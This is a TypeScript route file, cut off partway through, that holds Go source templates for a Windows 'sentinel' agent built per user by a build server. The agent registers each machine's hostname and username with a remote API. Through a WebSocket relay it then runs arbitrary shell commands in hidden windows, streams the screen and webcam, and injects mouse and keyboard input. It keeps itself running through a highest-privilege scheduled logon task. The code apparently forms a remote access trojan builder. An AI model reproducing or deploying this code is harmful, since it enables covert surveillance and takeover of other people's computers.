import { createFileRoute } from '@tanstack/react-router'

// ─────────────────────────────────────────────────────────────────────────────
// Go agent stub served to the build server (stdlib-only, Windows target).
//
// The agent connects to the HidenHost WebSocket relay as role=agent and
// handles commands pushed from the Control page in realtime:
//   • `cmd` { action:"shell.exec", id, cmd, timeout_ms } → runs cmd.exe /C
//   • `cmd` { action:"system.info", id }                 → replies with info
//   • `cmd` { action:"ping", id }                        → ok:true
// It also pushes `metrics` every 2s so the Info tab stays live, and sends
// one `info` snapshot on connect.
//
// HTTP endpoints are only used for auto-registration and heartbeat.
// ─────────────────────────────────────────────────────────────────────────────

const bindingGo = `package main

const (
	ownerUserID    = "{{USER_ID}}"
	apiBase        = "{{API_BASE}}"
	relayURL       = "{{RELAY_URL}}"
	buildName      = "{{BUILD_NAME}}"
	startupTask    = {{FEATURE_STARTUP}}
	startupName    = "{{STARTUP_NAME}}"
	debugConsole   = {{DEBUG}}
	buildTag       = "{{BUILD_TAG}}"
	hidenAuthKey   = "{{HIDEN_AUTH_KEY}}"
	bindDeviceID   = "{{BIND_DEVICE_ID}}"
	bindDeviceTok  = "{{BIND_DEVICE_TOKEN}}"
)
`

const goMod = `module sentinel-agent

go 1.22
`

const mainGo = `package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

var httpClient = &http.Client{Timeout: 30 * time.Second}

func httpJSON(method, path string, body any, out any) error {
	var r io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return err
		}
		r = bytes.NewReader(b)
	}
	req, err := http.NewRequest(method, apiBase+path, r)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Hiden-Auth", hidenAuthKey)
	req.Header.Set("User-Agent", "sentinel-go-agent/2.0 ("+buildName+")")
	resp, err := httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return fmt.Errorf("%s %s -> %d: %s", method, path, resp.StatusCode, string(raw))
	}
	if out != nil && len(raw) > 0 {
		return json.Unmarshal(raw, out)
	}
	return nil
}

// ─── identity ────────────────────────────────────────────────────────────────

type identity struct {
	DeviceID string ` + "`json:\"device_id\"`" + `
	Token    string ` + "`json:\"device_token\"`" + `
}

var ident identity
var startedAt = time.Now()

func pcName() string {
	n, err := os.Hostname()
	if err != nil || n == "" {
		return "unknown-pc"
	}
	return n
}

func whoami() string {
	u, err := user.Current()
	if err != nil || u == nil {
		return "unknown"
	}
	name := u.Username
	if i := strings.LastIndexAny(name, "\\\\/"); i >= 0 {
		name = name[i+1:]
	}
	return name
}

func identPath() string {
	dir, err := os.UserConfigDir()
	if err != nil || dir == "" {
		dir = os.TempDir()
	}
	p := filepath.Join(dir, "sentinel")
	_ = os.MkdirAll(p, 0o700)
	return filepath.Join(p, buildName+".json")
}

func loadIdent() bool {
	if bindDeviceID != "" && bindDeviceTok != "" {
		ident = identity{DeviceID: bindDeviceID, Token: bindDeviceTok}
		return true
	}
	raw, err := os.ReadFile(identPath())
	if err != nil {
		return false
	}
	_ = json.Unmarshal(raw, &ident)
	return ident.DeviceID != "" && ident.Token != ""
}

func saveIdent() {
	b, _ := json.Marshal(ident)
	_ = os.WriteFile(identPath(), b, 0o600)
}

func register() error {
	body := map[string]any{
		"bind_user_id": ownerUserID,
		"pc_name":      pcName(),
		"username":     whoami(),
		"os":           osLabel(),
		"platform":     "windows",
		"device_name":  buildName,
		"tag":          buildTag,
	}
	var resp struct {
		DeviceID string ` + "`json:\"device_id\"`" + `
		Token    string ` + "`json:\"device_token\"`" + `
	}
	if err := httpJSON("POST", "/api/public/agent/auto-register", body, &resp); err != nil {
		return err
	}
	if resp.DeviceID == "" || resp.Token == "" {
		return fmt.Errorf("register: empty id/token")
	}
	ident = identity{DeviceID: resp.DeviceID, Token: resp.Token}
	saveIdent()
	return nil
}

// ─── heartbeat (keeps devices.is_online fresh in DB) ─────────────────────────

func heartbeat() {
	m := currentMetrics()
	_ = httpJSON("POST", "/api/public/agent/heartbeat", map[string]any{
		"device_id":    ident.DeviceID,
		"device_token": ident.Token,
		"username":     whoami(),
		"metrics":      m,
	}, nil)
}

func heartbeatLoop() {
	heartbeat()
	t := time.NewTicker(15 * time.Second)
	defer t.Stop()
	for range t.C {
		heartbeat()
	}
}

// ─── system info / metrics ───────────────────────────────────────────────────

func osLabel() string {
	if runtime.GOOS == "windows" {
		return "Windows"
	}
	return runtime.GOOS
}

type metrics struct {
	CPUPercent    float64 ` + "`json:\"cpu_percent\"`" + `
	RAMPercent    float64 ` + "`json:\"ram_percent\"`" + `
	RAMUsedMB     int     ` + "`json:\"ram_used_mb\"`" + `
	RAMTotalMB    int     ` + "`json:\"ram_total_mb\"`" + `
	UptimeSeconds int64   ` + "`json:\"uptime_seconds\"`" + `
}

func currentMetrics() metrics {
	m := metrics{UptimeSeconds: systemUptimeSeconds()}
	total, free := memStatus()
	if total > 0 {
		used := total - free
		m.RAMTotalMB = int(total / (1024 * 1024))
		m.RAMUsedMB = int(used / (1024 * 1024))
		m.RAMPercent = float64(used) / float64(total) * 100.0
	}
	m.CPUPercent = cpuPercent()
	return m
}

func sysInfo() map[string]any {
	return map[string]any{
		"pc_name":    pcName(),
		"username":   whoami(),
		"os":         osLabel(),
		"arch":       runtime.GOARCH,
		"goroutines": runtime.NumGoroutine(),
		"num_cpu":    runtime.NumCPU(),
		"agent":      "sentinel-go/2.0",
		"build":      buildName,
		"tag":        buildTag,
		"started_at": startedAt.Unix(),
	}
}

// ─── command handling ────────────────────────────────────────────────────────

type cmdMsg struct {
	ID        string ` + "`json:\"id\"`" + `
	Action    string ` + "`json:\"action\"`" + `
	Cmd       string ` + "`json:\"cmd\"`" + `
	TimeoutMs int    ` + "`json:\"timeout_ms\"`" + `
}

func handleCommand(send chan<- []byte, p map[string]any) {
	// Decode leniently so unknown extra keys are ignored.
	raw, _ := json.Marshal(p)
	var c cmdMsg
	_ = json.Unmarshal(raw, &c)
	if c.ID == "" {
		return
	}
	switch c.Action {
	case "ping":
		sendResult(send, c.ID, true, map[string]any{"pong": true}, "")
	case "system.info":
		sendResult(send, c.ID, true, sysInfo(), "")
	case "system.metrics":
		sendResult(send, c.ID, true, currentMetrics(), "")
	case "shell.exec":
		go runShell(send, c)
	case "screen.start":
		screenStart(send, c.ID, p)
	case "screen.stop":
		screenStop(send, c.ID)
	case "screen.config":
		screenConfig(send, c.ID, p)
	case "camera.list":
		go cameraList(send, c.ID)
	case "camera.start":
		cameraStart(send, c.ID, p)
	case "camera.stop":
		cameraStop(send, c.ID)
	case "camera.config":
		cameraConfig(send, c.ID, p)
	case "input.mouse":
		inputMouseCmd(send, c.ID, p)
	case "input.key":
		inputKeyCmd(send, c.ID, p)
	default:
		sendResult(send, c.ID, false, nil, "not_supported: "+c.Action)
	}
}

func runShell(send chan<- []byte, c cmdMsg) {
	if strings.TrimSpace(c.Cmd) == "" {
		sendResult(send, c.ID, false, nil, "empty command")
		return
	}
	timeoutMs := c.TimeoutMs
	if timeoutMs <= 0 || timeoutMs > 120000 {
		timeoutMs = 25000
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutMs)*time.Millisecond)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", c.Cmd)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", c.Cmd)
	}
	hideWindow(cmd)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			exitCode = -1
		}
	}
	result := map[string]any{
		"stdout":    truncate(stdout.String(), 200_000),
		"stderr":    truncate(stderr.String(), 200_000),
		"exit_code": exitCode,
	}
	ok := true
	errMsg := ""
	if ctx.Err() == context.DeadlineExceeded {
		ok = false
		errMsg = "timeout"
	}
	sendResult(send, c.ID, ok, result, errMsg)
}

func truncate(s string, n int) string {
	if len(s) > n {
		return s[:n] + "\\n…[truncated]"
	}
	return s
}

func sendResult(send chan<- []byte, id string, ok bool, result any, errMsg string) {
	payload := map[string]any{"id": id, "ok": ok}
	if result != nil {
		payload["result"] = result
	}
	if errMsg != "" {
		payload["error"] = errMsg
	}
	msg := map[string]any{"type": "result", "payload": payload}
	b, _ := json.Marshal(msg)
	select {
	case send <- b:
	default:
	}
}

// ─── metrics push loop ───────────────────────────────────────────────────────

func metricsLoop(ctx context.Context, send chan<- []byte) {
	t := time.NewTicker(2 * time.Second)
	defer t.Stop()
	// one info snapshot up front
	b, _ := json.Marshal(map[string]any{"type": "info", "payload": sysInfo()})
	select {
	case send <- b:
	default:
	}
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
			mb, _ := json.Marshal(map[string]any{"type": "metrics", "payload": currentMetrics()})
			select {
			case send <- mb:
			default:
			}
		}
	}
}

// ─── WebSocket relay loop ────────────────────────────────────────────────────

var mu sync.Mutex

func wsRun() error {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	defer screenHardStop()

	send := make(chan []byte, 64)
	ws, err := wsDial(relayURL, map[string]string{
		"role":     "agent",
		"device":   ident.DeviceID,
		"clientId": "agent-" + ident.DeviceID,
		"key":      hidenAuthKey,
	})
	if err != nil {
		return err
	}
	defer ws.Close()
	logf("relay connected: %s", relayURL)

	// hello
	hello, _ := json.Marshal(map[string]any{
		"type":     "hello",
		"role":     "agent",
		"deviceId": ident.DeviceID,
	})
	if err := ws.WriteText(hello); err != nil {
		return err
	}

	go metricsLoop(ctx, send)

	// writer
	go func() {
		pinger := time.NewTicker(20 * time.Second)
		defer pinger.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case msg := <-send:
				mu.Lock()
				err := ws.WriteText(msg)
				mu.Unlock()
				if err != nil {
					cancel()
					return
				}
			case <-pinger.C:
				b, _ := json.Marshal(map[string]any{"type": "ping", "t": time.Now().UnixMilli()})
				mu.Lock()
				err := ws.WriteText(b)
				mu.Unlock()
				if err != nil {
					cancel()
					return
				}
			}
		}
	}()

	// reader
	for {
		op, data, err := ws.ReadMessage()
		if err != nil {
			return err
		}
		if op != 1 { // only text frames
			continue
		}
		var env struct {
			Type    string                 ` + "`json:\"type\"`" + `
			Payload map[string]any         ` + "`json:\"payload\"`" + `
		}
		if json.Unmarshal(data, &env) != nil {
			continue
		}
		switch env.Type {
		case "pong", "welcome", "viewer-joined", "viewer-left":
			// ignore
		case "cmd":
			handleCommand(send, env.Payload)
		}
	}
}

// ─── main ────────────────────────────────────────────────────────────────────

func logf(format string, args ...any) {
	if debugConsole {
		fmt.Printf("["+time.Now().Format("15:04:05")+"] "+format+"\\n", args...)
	}
}

func installStartup() {
	if !startupTask || runtime.GOOS != "windows" {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	name := startupName
	if name == "" {
		name = buildName
	}
	_ = exec.Command("schtasks", "/Create", "/F", "/SC", "ONLOGON",
		"/RL", "HIGHEST", "/TN", name, "/TR", exe).Run()
}

func main() {
	installStartup()
	if !loadIdent() {
		for i := 0; i < 20; i++ {
			if err := register(); err == nil {
				break
			}
			logf("register failed, retry in 5s")
			time.Sleep(5 * time.Second)
		}
	}
	logf("agent online device=%s", ident.DeviceID)
	go heartbeatLoop()
	// reconnect forever
	backoff := 2 * time.Second
	for {
		if err := wsRun(); err != nil {
			logf("relay error: %v", err)
		}
		time.Sleep(backoff)
		if backoff < 30*time.Second {
			backoff += 2 * time.Second
		}
	}
}
`

// ───────────────────────────────────────────────────────────────────────────── 
// Minimal stdlib WebSocket client (RFC 6455).  Enough for our relay:
//  • wss:// via crypto/tls
//  • text + ping/pong + close frames
//  • masked client-to-server frames (unmasked server-to-client)
// ─────────────────────────────────────────────────────────────────────────────

const wsGo = `package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type wsConn struct {
	conn net.Conn
	br   *bufio.Reader
}

func (w *wsConn) Close() error { return w.conn.Close() }

func wsDial(rawURL string, qs map[string]string) (*wsConn, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	tlsOn := u.Scheme == "wss"
	host := u.Host
	if !strings.Contains(host, ":") {
		if tlsOn {
			host += ":443"
		} else {
			host += ":80"
		}
	}
	q := u.Query()
	for k, v := range qs {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	d := &net.Dialer{Timeout: 15 * time.Second}
	var conn net.Conn
	if tlsOn {
		conn, err = tls.DialWithDialer(d, "tcp", host, &tls.Config{ServerName: u.Hostname()})
	} else {
		conn, err = d.Dial("tcp", host)
	}
	if err != nil {
		return nil, err
	}

	keyBytes := make([]byte, 16)
	_, _ = rand.Read(keyBytes)
	key := base64.StdEncoding.EncodeToString(keyBytes)

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	req := "GET " + path + " HTTP/1.1\\r\\n" +
		"Host: " + u.Host + "\\r\\n" +
		"Upgrade: websocket\\r\\n" +
		"Connection: Upgrade\\r\\n" +
		"Sec-WebSocket-Key: " + key + "\\r\\n" +
		"Sec-WebSocket-Version: 13\\r\\n" +
		"User-Agent: sentinel-go-ws/1.0\\r\\n\\r\\n"
	if _, err := conn.Write([]byte(req)); err != nil {
		conn.Close()
		return nil, err
	}
	br := bufio.NewReader(conn)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	resp.Body.Close()
	if resp.StatusCode != 101 {
		conn.Close()
		return nil, fmt.Errorf("ws handshake: HTTP %d", resp.StatusCode)
	}
	expect := wsAccept(key)
	if resp.Header.Get("Sec-WebSocket-Accept") != expect {
		conn.Close()
		return nil, errors.New("ws handshake: bad accept")
	}
	return &wsConn{conn: conn, br: br}, nil
}

func wsAccept(key string) string {
	h := sha1.New()
	h.Write([]byte(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

func (w *wsConn) WriteText(p []byte) error { return w.writeFrame(0x1, p) }

func (w *wsConn) writeFrame(opcode byte, payload []byte) error {
	// FIN=1 + opcode
	hdr := []byte{0x80 | (opcode & 0x0F)}
	n := len(payload)
	if n < 126 {
		hdr = append(hdr, 0x80|byte(n))
	} else if n <= 0xFFFF {
		hdr = append(hdr, 0x80|126, 0, 0)
		binary.BigEndian.PutUint16(hdr[len(hdr)-2:], uint16(n))
	} else {
		hdr = append(hdr, 0x80|127, 0, 0, 0, 0, 0, 0, 0, 0)
		binary.BigEndian.PutUint64(hdr[len(hdr)-8:], uint64(n))
	}
	mask := make([]byte, 4)
	_, _ = rand.Read(mask)
	hdr = append(hdr, mask...)
	masked := make([]byte, n)
	for i := 0; i < n; i++ {
		masked[i] = payload[i] ^ mask[i%4]
	}
	_ = w.conn.SetWriteDeadline(time.Now().Add(20 * time.Second))
	if _, err := w.conn.Write(hdr); err != nil {
		return err
	}
	if _, err := w.conn.Write(masked); err != nil {
		return err
	}
	return nil
}

// ReadMessage returns (opcode, payload, err). Pings are answered automatically
// and we loop until the caller gets a data frame.
func (w *wsConn) ReadMessage() (byte, []byte, error) {
	for {
		op, data, err := w.readFrame()
		if err != nil {
			return 0, nil, err
		}
		switch op {
		case 0x9: // ping
			_ = w.writeFrame(0xA, data)
		case 0xA: // pong
			// ignore
		case 0x8: // close
			_ = w.writeFrame(0x8, data)
			return 0, nil, io.EOF
		default:
			return op, data, nil
		}
	}
}

func (w *wsConn) readFrame() (byte, []byte, error) {
	_ = w.conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	hdr := make([]byte, 2)
	if _, err := io.ReadFull(w.br, hdr); err != nil {
		return 0, nil, err
	}
	opcode := hdr[0] & 0x0F
	masked := hdr[1]&0x80 != 0
	payloadLen := int64(hdr[1] & 0x7F)
	if payloadLen == 126 {
		ext := make([]byte, 2)
		if _, err := io.ReadFull(w.br, ext); err != nil {
			return 0, nil, err
		}
		payloadLen = int64(binary.BigEndian.Uint16(ext))
	} else if payloadLen == 127 {
		ext := make([]byte, 8)
		if _, err := io.ReadFull(w.br, ext); err != nil {
			return 0, nil, err
		}
		payloadLen = int64(binary.BigEndian.Uint64(ext))
	}
	var mask [4]byte
	if masked {
		if _, err := io.ReadFull(w.br, mask[:]); err != nil {
			return 0, nil, err
		}
	}
	if payloadLen < 0 || payloadLen > 32*1024*1024 {
		return 0, nil, fmt.Errorf("payload too large: %d", payloadLen)
	}
	data := make([]byte, payloadLen)
	if _, err := io.ReadFull(w.br, data); err != nil {
		return 0, nil, err
	}
	if masked {
		for i := range data {
			data[i] ^= mask[i%4]
		}
	}
	return opcode, data, nil
}
`

// ─────────────────────────────────────────────────────────────────────────────
// Windows-specific metrics (RAM via GlobalMemoryStatusEx, uptime via
// GetTickCount64, CPU% via GetSystemTimes delta).  Non-Windows build gets
// stubbed zeros.
// ─────────────────────────────────────────────────────────────────────────────

const metricsWindowsGo = `//go:build windows
package main

import (
	"os/exec"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32              = syscall.NewLazyDLL("kernel32.dll")
	procGlobalMemoryEx    = kernel32.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64    = kernel32.NewProc("GetTickCount64")
	procGetSystemTimes    = kernel32.NewProc("GetSystemTimes")
)

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

func memStatus() (total, free uint64) {
	var m memoryStatusEx
	m.Length = uint32(unsafe.Sizeof(m))
	r, _, _ := procGlobalMemoryEx.Call(uintptr(unsafe.Pointer(&m)))
	if r == 0 {
		return 0, 0
	}
	return m.TotalPhys, m.AvailPhys
}

func systemUptimeSeconds() int64 {
	r, _, _ := procGetTickCount64.Call()
	return int64(r / 1000)
}

var (
	cpuMu       sync.Mutex
	lastIdle    uint64
	lastKernel  uint64
	lastUser    uint64
	lastSampled time.Time
)

func fileTimeToU64(low, high uint32) uint64 {
	return uint64(high)<<32 | uint64(low)
}

func cpuPercent() float64 {
	cpuMu.Lock()
	defer cpuMu.Unlock()
	var idle, kernel, user [2]uint32
	r, _, _ := procGetSystemTimes.Call(
		uintptr(unsafe.Pointer(&idle[0])),
		uintptr(unsafe.Pointer(&kernel[0])),
		uintptr(unsafe.Pointer(&user[0])),
	)
	if r == 0 {
		return 0
	}
	curIdle := fileTimeToU64(idle[0], idle[1])
	curKernel := fileTimeToU64(kernel[0], kernel[1])
	curUser := fileTimeToU64(user[0], user[1])
	defer func() {
		lastIdle, lastKernel, lastUser = curIdle, curKernel, curUser
		lastSampled = time.Now()
	}()
	if lastSampled.IsZero() {
		return 0
	}
	totalDelta := (curKernel - lastKernel) + (curUser - lastUser)
	idleDelta := curIdle - lastIdle
	if totalDelta == 0 {
		return 0
	}
	busy := totalDelta - idleDelta
	return float64(busy) / float64(totalDelta) * 100.0
}

func hideWindow(c *exec.Cmd) {
	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
}
`

const metricsOtherGo = `//go:build !windows
package main

import "os/exec"

func memStatus() (uint64, uint64)     { return 0, 0 }
func systemUptimeSeconds() int64      { return 0 }
func cpuPercent() float64             { return 0 }
func hideWindow(_ *exec.Cmd)          {}
`

// ─────────────────────────────────────────────────────────────────────────────
// Live screen streaming + input injection (Windows only; other OS = stubs).
// ─────────────────────────────────────────────────────────────────────────────

const screenGo = `package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"image/jpeg"
	"sync"
	"time"
)

type screenState struct {
	mu      sync.Mutex
	running bool
	cancel  chan struct{}
	fps     int
	maxW    int
	quality int
}

var screen screenState

func getNum(p map[string]any, k string, def int) int {
	if v, ok := p[k]; ok {
		switch n := v.(type) {
		case float64:
			return int(n)
		case int:
			return n
		}
	}
	return def
}

func getFloat(p map[string]any, k string, def float64) float64 {
	if v, ok := p[k]; ok {
		if n, ok2 := v.(float64); ok2 {
			return n
		}
	}
	return def
}

func getStr(p map[string]any, k, def string) string {
	if v, ok := p[k]; ok {
		if s, ok2 := v.(string); ok2 {
			return s
		}
	}
	return def
}

func clampInt(v, lo, hi int) int {
	if v < lo {
		return lo
	}
	if v > hi {
		return hi
	}
	return v
}

func screenStart(send chan<- []byte, id string, p map[string]any) {
	screen.mu.Lock()
	screen.fps = clampInt(getNum(p, "fps", 10), 1, 30)
	screen.maxW = clampInt(getNum(p, "max_width", 1280), 320, 3840)
	screen.quality = clampInt(getNum(p, "quality", 55), 20, 90)
	if screen.running {
		screen.mu.Unlock()
		sendResult(send, id, true, map[string]any{"ok": true, "already": true}, "")
		return
	}
	screen.running = true
	screen.cancel = make(chan struct{})
	cancel := screen.cancel
	screen.mu.Unlock()
	go screenLoop(send, cancel)
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenStop(send chan<- []byte, id string) {
	screenHardStop()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenHardStop() {
	screen.mu.Lock()
	if screen.running {
		screen.running = false
		close(screen.cancel)
	}
	screen.mu.Unlock()
}

func screenConfig(send chan<- []byte, id string, p map[string]any) {
	screen.mu.Lock()
	if v := getNum(p, "fps", 0); v > 0 {
		screen.fps = clampInt(v, 1, 30)
	}
	if v := getNum(p, "max_width", 0); v > 0 {
		screen.maxW = clampInt(v, 320, 3840)
	}
	if v := getNum(p, "quality", 0); v > 0 {
		screen.quality = clampInt(v, 20, 90)
	}
	screen.mu.Unlock()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func screenLoop(send chan<- []byte, cancel chan struct{}) {
	for {
		select {
		case <-cancel:
			return
		default:
		}
		start := time.Now()
		screen.mu.Lock()
		fps := screen.fps
		maxW := screen.maxW
		quality := screen.quality
		screen.mu.Unlock()
		if fps <= 0 {
			fps = 10
		}
		img, w, h, err := captureFrame(maxW)
		if err == nil && img != nil {
			var buf bytes.Buffer
			if jerr := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); jerr == nil {
				b64 := base64.StdEncoding.EncodeToString(buf.Bytes())
				msg, _ := json.Marshal(map[string]any{
					"type": "screen.frame",
					"payload": map[string]any{
						"w":     w,
						"h":     h,
						"jpeg":  b64,
						"ts":    time.Now().UnixMilli(),
						"bytes": buf.Len(),
					},
				})
				select {
				case send <- msg:
				default:
				}
			}
		}
		target := time.Second / time.Duration(fps)
		elapsed := time.Since(start)
		if elapsed < target {
			select {
			case <-cancel:
				return
			case <-time.After(target - elapsed):
			}
		}
	}
}
`

// ─────────────────────────────────────────────────────────────────────────────
// Webcam / camera streaming — cross platform via ffmpeg (MJPEG pipe).
// Auto-downloads a static ffmpeg binary if not found on PATH — no manual
// install needed. Windows → dshow, macOS → avfoundation, Linux → v4l2.
// ─────────────────────────────────────────────────────────────────────────────

// Split into two template literals so the backtick-heavy regex section
// doesn't collide with the outer JS template.
const cameraGoBody = `
type cameraState struct {
	mu      sync.Mutex
	running bool
	cancel  context.CancelFunc
	device  string
	fps     int
	width   int
	quality int
}

var camera cameraState

func cameraDefaults() (string, int, int, int) {
	dev := ""
	switch runtime.GOOS {
	case "windows":
		dev = "video=Integrated Camera"
	case "darwin":
		dev = "0"
	default:
		dev = "/dev/video0"
	}
	return dev, 15, 640, 5
}

// ensureFfmpeg returns the path to an ffmpeg binary. It checks PATH first,
// then looks for a cached download in %APPDATA%/sentinel (Windows) or
// ~/.local/share/sentinel (Unix). If neither exists it auto-downloads a
// static build so the user never has to install anything manually.
func ensureFfmpeg() (string, error) {
	if p, err := exec.LookPath("ffmpeg"); err == nil {
		return p, nil
	}
	dir := ffmpegCacheDir()
	bin := filepath.Join(dir, ffmpegBinName())
	if _, err := os.Stat(bin); err == nil {
		return bin, nil
	}
	url := ffmpegDownloadURL()
	if url == "" {
		return "", fmt.Errorf("no ffmpeg on PATH and auto-download not supported on %s/%s", runtime.GOOS, runtime.GOARCH)
	}
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", fmt.Errorf("mkdir %s: %w", dir, err)
	}
	if runtime.GOOS == "windows" {
		return downloadFfmpegZip(url, dir, bin)
	}
	return downloadFfmpegDirect(url, bin)
}

// downloadFfmpegDirect saves a direct binary URL straight to disk.
func downloadFfmpegDirect(url, bin string) (string, error) {
	tmp := bin + ".tmp"
	out, err := os.Create(tmp)
	if err != nil {
		return "", err
	}
	resp, err := http.Get(url)
	if err != nil {
		out.Close(); os.Remove(tmp)
		return "", fmt.Errorf("download ffmpeg: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		out.Close(); os.Remove(tmp)
		return "", fmt.Errorf("download ffmpeg: HTTP %d", resp.StatusCode)
	}
	_, err = io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		os.Remove(tmp)
		return "", fmt.Errorf("download ffmpeg: %w", err)
	}
	os.Chmod(tmp, 0755)
	if err := os.Rename(tmp, bin); err != nil {
		return "", err
	}
	return bin, nil
}

// downloadFfmpegZip downloads a zip archive and extracts the first file whose
// base name is ffmpeg.exe (BtbN / gyan.dev builds nest it in a subfolder).
func downloadFfmpegZip(url, dir, bin string) (string, error) {
	zipPath := filepath.Join(dir, "ffmpeg-dl.zip")
	defer os.Remove(zipPath)
	out, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	resp, err := http.Get(url)
	if err != nil {
		out.Close(); os.Remove(zipPath)
		return "", fmt.Errorf("download ffmpeg zip: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		out.Close(); os.Remove(zipPath)
		return "", fmt.Errorf("download ffmpeg zip: HTTP %d", resp.StatusCode)
	}
	_, err = io.Copy(out, resp.Body)
	out.Close()
	if err != nil {
		os.Remove(zipPath)
		return "", fmt.Errorf("download ffmpeg zip: %w", err)
	}
	zr, err := zip.OpenReader(zipPath)
	if err != nil {
		return "", fmt.Errorf("open ffmpeg zip: %w", err)
	}
	defer zr.Close()
	target := ffmpegBinName()
	for _, f := range zr.File {
		if strings.ToLower(filepath.Base(f.Name)) != target {
			continue
		}
		rc, err := f.Open()
		if err != nil {
			return "", err
		}
		tmp := bin + ".tmp"
		w, err := os.Create(tmp)
		if err != nil {
			rc.Close()
			return "", err
		}
		_, err = io.Copy(w, rc)
		w.Close(); rc.Close()
		if err != nil {
			os.Remove(tmp)
			return "", err
		}
		os.Chmod(tmp, 0755)
		if err := os.Rename(tmp, bin); err != nil {
			return "", err
		}
		return bin, nil
	}
	return "", fmt.Errorf("ffmpeg.exe not found inside downloaded archive")
}


func ffmpegCacheDir() string {
	switch runtime.GOOS {
	case "windows":
		base := os.Getenv("APPDATA")
		if base == "" {
			base = os.Getenv("LOCALAPPDATA")
		}
		if base == "" {
			base = "."
		}
		return filepath.Join(base, "sentinel", "tools")
	default:
		home, _ := os.UserHomeDir()
		return filepath.Join(home, ".local", "share", "sentinel", "tools")
	}
}

func ffmpegBinName() string {
	if runtime.GOOS == "windows" {
		return "ffmpeg.exe"
	}
	return "ffmpeg"
}

func ffmpegDownloadURL() string {
	// Static GPL builds from github.com/BtbN/FFmpeg-Builds (well-known, reliable).
	switch runtime.GOOS + "/" + runtime.GOARCH {
	case "windows/amd64":
		return "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
	case "linux/amd64":
		return "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-linux64-gpl.tar.xz"
	case "darwin/amd64", "darwin/arm64":
		// evermeet.cx provides static macOS builds
		return ""
	}
	return ""
}

func cameraStart(send chan<- []byte, id string, p map[string]any) {
	camera.mu.Lock()
	if camera.running {
		camera.mu.Unlock()
		sendResult(send, id, true, map[string]any{"ok": true, "already": true}, "")
		return
	}
	defDev, defFps, defW, defQ := cameraDefaults()
	camera.device = getStr(p, "device", defDev)
	camera.fps = clampInt(getNum(p, "fps", defFps), 1, 30)
	camera.width = clampInt(getNum(p, "width", defW), 160, 1920)
	camera.quality = clampInt(getNum(p, "quality", defQ), 2, 31)
	ctx, cancel := context.WithCancel(context.Background())
	camera.cancel = cancel
	camera.running = true
	camera.mu.Unlock()
	go cameraLoop(send, ctx)
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func cameraStop(send chan<- []byte, id string) {
	cameraHardStop()
	sendResult(send, id, true, map[string]any{"ok": true}, "")
}

func cameraHardStop() {
	camera.mu.Lock()
	if camera.running {
		camera.running = false
		if camera.cancel != nil {
			camera.cancel()
		}
	}
	camera.mu.Unlock()
}

func cameraConfig(send chan<- []byte, id string, p map[string]any) {
	camera.mu.Lock()
	if v := getStr(p, "device", ""); v != "" {
		camera.device = v
	}
	if v := getNum(p, "fps", 0); v > 0 {
		camera.fps = clampInt(v, 1, 30)
	}
	if v := getNum(p, "width", 0); v > 0 {
		camera.width = clampInt(v, 160, 1920)
	}
	if v := getNum(p, "quality", 0); v > 0 {
		camera.quality = clampInt(v, 2, 31)
	}
	restart := camera.running
	camera.mu.Unlock()
	sendResult(send, id, true, map[string]any{"ok": true, "restart": restart}, "")
	if restart {
		cameraHardStop()
		cameraStart(send, id+"-r", map[string]any{})
	}
}

func cameraFfmpegArgs() []string {
	camera.mu.Lock()
	dev := camera.device
	fps := camera.fps
	w := camera.width
	q := camera.quality
	camera.mu.Unlock()
